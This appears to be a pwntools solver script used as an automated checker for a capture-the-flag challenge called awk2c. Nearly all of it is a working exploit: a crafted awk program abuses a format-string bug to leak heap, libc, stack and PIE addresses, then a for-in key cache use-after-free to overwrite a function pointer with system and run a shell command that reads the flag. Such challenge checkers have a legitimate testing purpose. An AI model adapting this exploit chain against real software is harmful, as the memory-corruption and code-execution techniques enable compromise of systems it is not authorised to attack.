#!/usr/bin/env python3
"""
Automated checker for awk2c.

We use the fmtstr bug to leak a heap address, then for arbitrary read, to get libc, stack, and pie
addresses. Then trigger the for-in key cache bug to get fake strings whose refcounts are on top of
the bytes of g_end_rules, incref them to write the address of system. Then reference the command
string to get its address into rdi and exit from a function to call g_end_rules.
"""

from pwn import *

import os
import re
import sys
from pathlib import Path
from urllib.parse import urlparse

context.log_level = "error"

endpoint = os.environ["SESSION_ENDPOINT"]
u = urlparse(endpoint)
if not u.hostname or not u.port:
    sys.exit(f"bad SESSION_ENDPOINT: {endpoint!r}")

# sni_proxy endpoints are TLS-terminated at the ingress with a cert we have
# no reason to trust; same treatment as the other checkers in this repo.
use_ssl = u.scheme in ("tls", "https", "ssl")


def pack_double(addr):
    d = struct.unpack("d", p64(addr))[0]
    assert u64(struct.pack("d", d)) == addr, "double round-trip failure"
    s = repr(d)
    assert "\n" not in s, "newline in addr"
    return s.encode()


def unpack_leak(data):
    assert len(data) >= 5, "null byte in addr"
    return u64(data.ljust(8, b"\0"))


def exploit(r):
    r.send(b"""
BEGIN {
    print "start"
    fflush(stdout)

    # Leak heap addr
    OFMT = "%p %p %p"
    print 1.1
    print "leak"
    fflush(stdout)

    # Get libc pointer on heap: fill tcache then get chunk in unsorted bin
    getline long
    arr[0] = toupper(long)
    arr[1] = toupper(long)
    arr[2] = toupper(long)
    arr[3] = toupper(long)
    arr[4] = toupper(long)
    arr[5] = toupper(long)
    arr[6] = toupper(long)
    arr[7] = toupper(long)
    arr[8] = toupper(long)
    arr[9] = toupper(long)
    arr[8] = 1
    arr[7] = 1
    arr[6] = 1
    arr[5] = 1
    arr[4] = 1
    arr[3] = 1
    arr[2] = 1
    arr[0] = 1
    arr[1] = 1

    # Arb read to get libc addr
    getline a
    a = a + 0
    OFMT = "%p %s"
    print a
    print "leak"
    fflush(stdout)

    # Arb read to get stack addr
    getline a
    a = a + 0
    OFMT = "%p %s"
    print a
    print "leak"
    fflush(stdout)

    # Arb read to get pie addr
    getline a
    a = a + 0
    OFMT = "%p %s"
    print a
    print "leak"
    fflush(stdout)

    # Trigger bug to get arb write
    i = 0
    for (k in arr) {
        if (i == 0) {
            getline a1
            # Realloc victim array
            arr[10] = 1.1
            arr[11] = 1.2
            arr[12] = 1.3
            arr[13] = 1.4
            arr[14] = 1.5
            arr[15] = 1.6
            arr[16] = 1.7
            # Reclaim victim array with string
            getline a2
        } else {
            # Write system addr byte by byte
            getline a3
            while (a3-- > 0) {
                keep[j++] = k
            }

            if (i == 6) {
                k = 1
                break
            }
        }

        i++
    }

    getline a
    print "done"
    myexit()
}

function myexit() {
    # Get command into rdi
    a
    exit
}

""")
    r.sendline(b"END")

    r.recvuntil(b"start\n")

    # Get heap leak from fmtstr
    heap = int(r.recvuntilS(b"leak").splitlines()[0].split()[-1], 0) - 0x390 - 0x1030
    info("heap @ %#x", heap)

    # Smallbin size, into "long" above
    r.sendline(b"A" * 0x210)

    # Read libc addr from heap
    r.sendline(pack_double(heap + 0x2ca8))
    r.recvuntil(b"0x7 ")
    libc = unpack_leak(r.recvuntil(b"\nleak\n", drop=True)) - 0x203d40
    info("libc @ %#x", libc)

    # Read stack addr from libc
    r.sendline(pack_double(libc + 0x20ad58))
    r.recvuntil(b"0x7 ")
    stack = unpack_leak(r.recvuntil(b"\nleak\n", drop=True)) - 0x0
    info("stack @ %#x", stack)

    # Read pie addr from stack
    r.sendline(pack_double(stack + 0x2b0))
    r.recvuntil(b"0x7 ")
    pie = unpack_leak(r.recvuntil(b"\nleak\n", drop=True)) - 0x40
    info("pie @ %#x", pie)

    r.sendline(b"AAAA")
    # Reclaim victim array, include write targets (g_end_rules)
    pay = (b"B" * 0x10 + b"".join(p64(pie + 0xc348 + i + 0x10) + b"B" * 0x18 for i in range(6))).ljust(0x1e8, b"B")
    assert b"\n" not in pay, "newline in addr"
    r.sendline(pay)
    # Overwrite with system
    for x in p64(libc + 0x58750)[:6]:
        r.sendline(str(x).encode())

    # Send command, get flag
    r.sendline(b"cat flag.txt")
    out = r.recvall(timeout=5)

    m = re.search(rb"ECSC\{[^}\n]+\}", out)
    if not m:
        print(f"no flag in output: {out!r}")
        return
    flag = m.group()
    with open("/flag", "wb") as f:
        f.write(flag)
    print("wrote flag:", flag.decode())


for _ in range(8):
    try:
        with remote(u.hostname, u.port, ssl=use_ssl) as r:
            sleep(2)
            exploit(r)
    except AssertionError as e:
        print(f"--- transient error, retrying: {e} ---")
        continue
    else:
        break
else:
    print("--- giving up ---")
